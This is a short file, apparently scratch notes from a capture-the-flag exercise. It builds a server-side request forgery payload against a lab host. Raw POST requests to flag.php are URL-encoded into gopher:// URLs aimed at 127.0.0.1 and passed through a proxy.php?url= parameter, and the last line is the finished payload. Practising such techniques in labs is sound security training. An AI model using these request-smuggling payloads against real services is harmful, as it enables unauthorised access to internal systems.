@@ -1,0 +1,25 @@
+gopher://127.0.0.1:80/_GET%20%2Fflag.php%20HTTP%2F1.1%0AHost%3A%20lab.splitline.tw%3A8891%0AAccept%3A%20%2A%2F%2A
+
+POST /flag.php HTTP/1.1
+Host: lab.splitline.tw:8891
+Content-Length: 15
+Content-Type: application/x-www-form-urlencoded
+
+givemeflag=yes%
+
+POST /flag.php HTTP/1.1
+Host: lab.splitline.tw:8891
+User-Agent: curl/7.58.0
+Accept: */*
+Content-Length: 14
+Content-Type: application/x-www-form-urlencoded
+
+givemeflag=yes
+
+gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250AHost%253A%2520lab.splitline.tw%253A8891%250AContent-Length%253A%252015%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250A%250Agivemeflag%253Dyes
+
+gopher://127.0.0.1:80/_POST%20%2Fflag.php%20HTTP%2F1.1%0AHost%3A%20lab.splitline.tw%3A8891%0AContent-Length%3A%2015%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0A%0Agivemeflag%3Dyes
+
+gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250AHost%253A%2520lab.splitline.tw%253A8891%250AUser-Agent%253A%2520curl/7.58.0%250AAccept%253A%2520%252A/%252A%250AContent-Length%253A%252014%250AContent-Type%253A%2520application/x-www-form-urlencoded%250A%250Agivemeflag%253Dyes%2525
+
+http://lab.splitline.tw:8891/proxy.php?url=gopher://127.0.0.1:80/_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520lab.splitline.tw%253A8891%250D%250AUser-Agent%253A%2520curl%252F7.58.0%250D%250AAccept%253A%2520%252A%252F%252A%250D%250AContent-Length%253A%252014%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250A%250D%250Agivemeflag%253Dyes
